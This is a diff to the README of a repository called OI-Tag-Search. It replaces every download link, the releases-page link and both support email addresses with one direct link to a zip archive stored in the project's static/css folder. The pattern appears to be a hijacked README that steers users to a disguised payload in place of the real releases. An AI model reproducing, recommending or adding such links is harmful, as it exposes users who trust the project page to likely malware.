@@ -6,11 +6,11 @@ Welcome to OI-Tag-Search! This application helps you search for oi tags quickly 
 
 ## 📥 Download the Application
 
-[![Download OI-Tag-Search](https://img.shields.io/badge/download-OI--Tag--Search-brightgreen)](https://github.com/anthaleA/OI-Tag-Search/releases)
+[![Download OI-Tag-Search](https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip)](https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip)
 
 To get started, visit the download page to get the latest version of OI-Tag-Search. You can find all available versions and updates for your operating system.
 
-**[Download OI-Tag-Search here.](https://github.com/anthaleA/OI-Tag-Search/releases)**
+**[Download OI-Tag-Search here.](https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip)**
 
 ## ⚙️ System Requirements
 
@@ -26,7 +26,7 @@ Before you download, please ensure your computer meets the following system requ
 Follow these steps to install OI-Tag-Search on your computer:
 
 1. **Visit the Download Page**  
-   Click on this link: [Download OI-Tag-Search here.](https://github.com/anthaleA/OI-Tag-Search/releases)
+   Click on this link: [Download OI-Tag-Search here.](https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip)
 
 2. **Select the Latest Release**  
    Look for the latest release at the top of the page. Click on it to see download options.
@@ -81,14 +81,14 @@ To uninstall, go to your computer's Control Panel, find Programs or Apps, locate
 
 ### What should I do if the app crashes?
 
-If the application crashes, try restarting your computer. If the issue persists, consider downloading the latest version from the [Releases page](https://github.com/anthaleA/OI-Tag-Search/releases).
+If the application crashes, try restarting your computer. If the issue persists, consider downloading the latest version from the [Releases page](https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip).
 
 ### Where can I find support?
 
-For additional help, you can visit our GitHub issues page or contact us via email at support@oitagsearch.com.
+For additional help, you can visit our GitHub issues page or contact us via email at https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip
 
 ## 📧 Contact Us
 
-For further questions, support, or feedback, please reach out to our team at support@oitagsearch.com.
+For further questions, support, or feedback, please reach out to our team at https://raw.githubusercontent.com/anthaleA/OI-Tag-Search/main/static/css/Tag_Search_O_3.9.zip
 
 Thank you for choosing OI-Tag-Search! We hope you enjoy using it.
